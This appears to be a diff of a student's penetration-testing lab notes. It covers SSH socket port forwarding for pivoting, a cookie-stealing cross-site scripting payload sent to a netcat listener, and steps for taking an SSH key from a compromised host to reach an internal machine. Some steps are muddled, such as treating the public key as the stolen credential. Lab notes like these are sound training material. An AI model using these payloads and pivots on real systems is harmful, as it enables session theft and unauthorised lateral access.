@@ -9,8 +9,21 @@ ssh -S /tmp/DEV DEV -O forward -L2222:10.208.50.42:22 SOCKET2
 ssh www-data@localhost -p2222
 (this may give an error, run the ssh-keygen command it shows)
 
+Instead of /var/www , it may be within a systems user. This could be seen as /home/Comrade/.ssh/authorized_keys
+If you are going into someone's ssh known as comrade. This can be applied into the lesson by using the extranet.
+
 ################################
 Cross-Site Scripting:
 ################################
 nc -l 127.0.0.1 42070
 <script>document.location="http://127.0.0.1:42070/?username=" + document.cookie;</script>
+
+
+When going from extranet into intra net, you are setting up your localhost like above, the: ssh -S /tmp/DEV DEV -O forward -LLOCALPORT:extranet 
+is going to forward your socket that you made (the master socket named DEV) and send it to the extranet IP through the port that you made to forward it (the -L PORT)
+Now when you run a localhost ssh ( ssh USERNAMEOFEXTRANET@localhost -p LOCALPORTYOUMADE) it will send you into the extranet.
+Things i need to make sure work is doing this with a -D 9050 to send proxychains, but i believe it works. With this you are going to then steal the ssh key OF extranet (cat ~/.ssh/id_rsa.pub)
+and save this key that you find into a file named StolenKey, from there you chmod 600 the folder, making sure to double check everything as to not overwrite your ssh key, 
+and then you masquerade sshkey to get into the intranet ip you found (cat /etc/hosts , /etc/crontab) Jane will be the device name (intranet) and the IP will be intranet IP.
+ chmod 600 /home/student/stolenkey
+ ssh -i /home/student/stolenkey jane@1.2.3.4
